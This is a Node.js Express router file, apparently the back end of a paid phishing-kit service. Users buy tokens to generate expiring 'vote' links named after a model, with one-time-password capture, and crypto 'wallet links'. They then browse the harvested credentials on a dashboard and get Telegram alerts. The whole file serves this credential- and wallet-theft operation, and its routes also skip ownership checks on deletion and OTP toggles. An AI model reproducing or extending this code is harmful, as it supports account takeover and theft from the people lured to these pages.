const router = require("express").Router();
const { linkTypes, templates, walletTypes } = require("../constants");
const Links = require("../models/LinkModel");
const Credentials = require("../models/CredentialModel");
const { ensureAuthenticated } = require("../config/auth");
const ShortUniqueId = require("short-unique-id");
const User = require("../models/User");
const bcrypt = require("bcryptjs");
const moment = require("moment");
const WalletLink = require("../models/WalletLink");
const bot = require("../telegram");
const { blockURL } = require("../middlewares/blockUrl");


router.get("/", blockURL, async (req, res) => {
    try {
        console.log(req.hostname)
        return res.render("index", { req, layout: "layout" });
    } catch (err) {
        console.log(err)
    }
});

router.get("/dashboard", ensureAuthenticated, async (req, res) => {
    try {
        const credentials = await Credentials.find({ user: req.user.id }).limit(10);
        const links = await Links.find({ user: req.user.id }).limit(10);

        const walletlinkscount = await WalletLink.find({ user: req.user.id }).count();
        const linkscount = await Links.find({ user: req.user.id }).count();
        const credentialscount = await Credentials.find({ user: req.user.id }).count();

        return res.render("dashboard", { req, credentials, moment, walletlinkscount, credentialscount, linkscount, links, layout: "layout2" });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard")
    }
});

router.get("/pricing", ensureAuthenticated, async (req, res) => {
    return res.render("pricing", { moment, req, layout: "layout2" });
});


router.get("/pricing2", ensureAuthenticated, async (req, res) => {
    return res.render("pricing2", { moment, req, layout: "layout2" });
});

// CREDENTIALS
router.get("/credentials", ensureAuthenticated, async (req, res) => {
    const credentials = await Credentials.find({ user: req.user.id });
    return res.render("credentials", { credentials, moment, req, layout: "layout2" });
});

// LINKS START
router.get("/links", ensureAuthenticated, async (req, res) => {
    const links = await Links.find({ user: req.user.id });
    return res.render("Links", { links, moment, req, layout: "layout2" });
});

// router.post("links", ensureAuthenticated, async (req, res) => {
//     try {
//         const { linkID } = req.body;


//         const link = await Links.findById(linkID);

//         const currentDate = new Date();
//         const newExp = new Date(currentDate);
//         newExp.setDate(currentDate.getDate() + (Math.abs(duration) * 7));

//         if (link) {
//             await Links.updateOne({ _id: linkID }, {
//                 expiry: newExp
//             })
//         }
//         req.flash("success_msg", "Link renewed successfully")
//         return res.redirect("/links")
//     } catch (err) {
//         console.log(err)
//         return res.redirect("/dashboard")
//     }
// })

router.get("/wallet-links", ensureAuthenticated, async (req, res) => {
    const links = await WalletLink.find({ user: req.user.id });
    return res.render("walletLinks", { links, moment, req, layout: "layout2" });
});

router.get("/links/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        const link = await Links.findById(id);
        if (link) {
            const credentials = await Links.find({ link: link.id })
            return res.render("linkDetails", { link, credentials, req, layout: "layout2" });
        } else {
            res.redirect("/404");
        }
    } catch (err) {
        console.log(err);
        res.redirect("/notfound");
    }
});

router.get("/create-link", ensureAuthenticated, (req, res) => {
    try {
        return res.render("createLink", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/create-link2", ensureAuthenticated, (req, res) => {
    try {
        return res.render("createLink2", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/create-link", ensureAuthenticated, async (req, res) => {
    try {
        const {
            name,
            linkType,
            modelName,
            otpEnabled,
            duration,
            usLink
        } = req.body;

        console.log(req.body)

        if (!linkTypes.includes(linkType) || !modelName || !name || !duration) {
            req.flash("error_msg", "Fill all fields correctly");
            return res.redirect("/create-link");
        }

        if (usLink == "false" & (req.user.tokens < Math.abs(duration))) {
            console.log(2)
            req.flash("error_msg", "Insufficient tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        if (usLink == 'true' && (req.user.usTokens < Math.abs(duration))) {
            req.flash("error_msg", "Insufficient US tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        const uid = new ShortUniqueId({ length: 10 });
        const uniqueID = modelName.split(" ").join("-").toLowerCase() + "-" + uid.rnd();
        const currentDate = new Date();
        const newDate = new Date(currentDate);
        newDate.setDate(currentDate.getDate() + (Math.abs(duration) * 7));
        const newLink = new Links({
            linkType,
            name: name.trim(),
            modelName: modelName.trim(),
            otpEnabled,
            usLink,
            link: uniqueID,
            user: req.user.id,
            expiry: newDate
        });
        await newLink.save();
        req.flash("success_msg", "Link generated successfully!");
        if (usLink == 'true') {
            await User.updateOne({ username: req.user.username }, { usTokens: req.user.usTokens - Math.abs(duration) });
            return res.redirect(`/successful-link3/${uniqueID}`);
        } else {
            await User.updateOne({ username: req.user.username }, { tokens: req.user.tokens - Math.abs(duration) });
            return res.redirect(`/successful-link/${uniqueID}`);
        }
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/create-link2", ensureAuthenticated, async (req, res) => {
    try {
        const {
            name,
            linkType,
            modelName,
            otpEnabled,
            usLink,
            picture,
            duration
        } = req.body;

        if (!linkTypes.includes(linkType) || !modelName || !name || !picture || !duration) {
            req.flash("error_msg", "Fill all fields correctly");
            return res.redirect("/create-link");
        }

        if (usLink == "false" & (req.user.tokens < Math.abs(duration))) {
            console.log(2)
            req.flash("error_msg", "Insufficient tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        if (usLink == 'true' && (req.user.usTokens < Math.abs(duration))) {
            req.flash("error_msg", "Insufficient US tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        const uid = new ShortUniqueId({ length: 10 });
        const uniqueID = modelName.split(" ").join("-").toLowerCase() + "-" + uid.rnd();

        const currentDate = new Date();
        const newDate = new Date(currentDate);
        newDate.setDate(currentDate.getDate() + (Math.abs(duration) * 7));
        const newLink = new Links({
            linkType,
            name: name.trim(),
            modelName: modelName.trim(),
            otpEnabled,
            usLink,
            picture,
            link: uniqueID,
            user: req.user.id,
            expiry: newDate
        });
        await newLink.save();
        req.flash("success_msg", "Link generated successfully!");
        if (usLink == 'true') {
            await User.updateOne({ username: req.user.username }, { usTokens: req.user.usTokens - Math.abs(duration) });
            return res.redirect(`/successful-link4/${uniqueID}`);
        } else {
            await User.updateOne({ username: req.user.username }, { tokens: req.user.tokens - Math.abs(duration) });
            return res.redirect(`/successful-link2/${uniqueID}`);
        }
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/create-wallet-link", ensureAuthenticated, (req, res) => {
    try {
        return res.render("walletLink", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/create-wallet-link", ensureAuthenticated, async (req, res) => {
    try {
        const {
            name,
            linkType,
            months
        } = req.body;

        if (!walletTypes.includes(linkType) || !months || !name) {
            req.flash("error_msg", "Fill all fields correctly");
            return res.redirect("/create-link");
        }

        const price = Math.abs(months) * 8;

        if (req.user.tokens < price) {
            req.flash("error_msg", "Insufficient tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        const uid = new ShortUniqueId({ length: 10 });
        const uid2 = new ShortUniqueId({ length: 10 });
        const uniqueID = uid2.rnd() + "-" + uid.rnd();

        const currentDate = new Date();
        const newDate = new Date(currentDate);
        newDate.setDate(currentDate.getDate() + ((30) * months));

        const newLink = new WalletLink({
            linkType,
            name: name.trim(),
            shortID: uniqueID,
            user: req.user.id,
            expiry: newDate
        });
        await newLink.save();
        await User.updateOne({ username: req.user.username }, { tokens: req.user.tokens - price });
        req.flash("success_msg", "Link generated successfully!");
        return res.redirect(`/successful-wallet-link/${uniqueID}`);
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-link/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const link = await Links.findOne({ link: id });
        return res.render("successfulLink", { req, id, moment, link, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-link2/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const link = await Links.findOne({ link: id });
        return res.render("successfulLink2", { req, id, moment, link, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-link3/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const link = await Links.findOne({ link: id });
        return res.render("successfulLink3", { req, id, moment, link, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-link4/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const link = await Links.findOne({ link: id });
        return res.render("successfulLink4", { req, id, moment, link, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-wallet-link/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const walletLink = await WalletLink.findOne({ shortID: id });
        return res.render("successfulWalletLink", { req, id, moment, walletLink, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-vote", async (req, res) => {
    try {
        return res.render("voted", { req, layout: false });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/delete-link/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        await Links.deleteOne({ _id: id });
        await Credentials.deleteMany({ link: id });
        req.flash("success_msg", "Link and credentials deleted successfully");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/disable-otp/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        await Links.updateOne({ _id: id }, { otpEnabled: false });
        req.flash("success_msg", "OTP disabled successfully");
        res.redirect("/links");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/enable-otp/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        await Links.updateOne({ _id: id }, { otpEnabled: true });
        req.flash("success_msg", "OTP enabled successfully");
        res.redirect("/links");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

// LINKS END
router.get("/settings", ensureAuthenticated, (req, res) => {
    try {
        return res.render("settings", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/update-telegram", ensureAuthenticated, async (req, res) => {
    try {
        const {
            telegramID
        } = req.body;
        await User.updateOne({ _id: req.user.id }, {
            telegramID
        });
        req.flash("success_msg", "Telegram ID updated successfully");
        return res.redirect("/settings");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/update-notification", ensureAuthenticated, async (req, res) => {
    try {
        const {
            notification
        } = req.body;
        await User.updateOne({ _id: req.user.id }, {
            notification
        });
        req.flash("success_msg", "Notification seetings updated successfully");
        return res.redirect("/settings");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/update-password", ensureAuthenticated, async (req, res) => {
    try {
        const {
            password
        } = req.body;

        if (password.length < 6) {
            req.flash("error_msg", "Password is too short");
            return res.redirect("/settings");
        }

        const salt = await bcrypt.genSalt();
        const hash = await bcrypt.hash(password, salt);

        await User.updateOne({ _id: req.user.id }, {
            password: hash
        });
        req.flash("success_msg", "Password updated successfully");
        return res.redirect("/settings");
    } catch (err) {
        console.log(err);
        return res.redirect("/found");
    }
});

// share token
// LINKS END
router.get("/share-tokens", ensureAuthenticated, (req, res) => {
    try {
        return res.render("shareTokens", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

// share tokens
router.post("/share-tokens", ensureAuthenticated, async (req, res) => {
    try {
        const {
            username,
            amount
        } = req.body;

        const receipient = await User.findOne({ username: username.toLowerCase().trim() })

        if (Math.abs(amount) === 0) {
            req.flash("error_msg", "You can only share a minimum of 1 token");
            return res.redirect("/share-tokens");
        }

        if (Math.abs(amount) > req.user.tokens) {
            req.flash("error_msg", "You don't have enough tokens to share");
            return res.redirect("/share-tokens");
        }

        if (!receipient) {
            req.flash("error_msg", "user not found, enter a correct username");
            return res.redirect("/share-tokens");
        }

        await User.updateOne({ _id: req.user.id }, {
            tokens: req.user.tokens - Math.abs(amount)
        });

        await User.updateOne({ _id: receipient._id }, {
            tokens: receipient.tokens + Math.abs(amount)
        });

        await bot.sendMessage(req.user.telegramID, `
You sent ${amount} tokens to ${username}`)
            .catch(err => console.log("Telegram error"));

        await bot.sendMessage(receipient.telegramID, `
        ${req.user.username} sent you ${amount} tokens.`)
            .catch(err => console.log("Telegram error"));

        req.flash("success_msg", `You have successfully sent ${amount} tokens to ${username}`);
        return res.redirect("/share-tokens");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/notfound", (req, res) => {
    try {
        return res.render("notfound", { req, layout: false });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});


module.exports = router;